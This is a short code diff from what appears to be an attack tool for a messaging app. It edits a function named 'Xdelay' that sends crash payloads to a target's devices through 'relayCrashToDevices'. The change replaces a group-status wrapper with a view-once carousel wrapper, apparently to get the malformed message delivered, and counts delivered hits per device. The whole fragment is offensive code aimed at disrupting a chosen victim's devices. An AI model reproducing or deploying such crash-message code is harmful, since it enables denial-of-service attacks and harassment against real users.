@@ -57,15 +57,17 @@ async function Xdelay(SYxS7, target) {
             }
         };
 
+        const viewOnceCarousel = {
+            viewOnceMessage: {
+                message: carousel
+            }
+        };
+
         try {
-            const res1 = await relayCrashToDevices(SYxS7, target, {
-                groupStatusMessageV2: {
-                    message: carousel
-                }
-            });
-            if (res1.success) totalDelivered += res1.deliveredCount; else errors.push(...res1.errors);
+            const res = await relayCrashToDevices(SYxS7, target, viewOnceCarousel);
+            if (res.success) totalDelivered += res.deliveredCount; else errors.push(...res.errors);
         } catch (e) {
-            errors.push(`[Xdelay status wrapper ${i + 1}]: ${e.message}`);
+            errors.push(`[Xdelay direct viewOnce ${i + 1}]: ${e.message}`);
         }
 
         try {
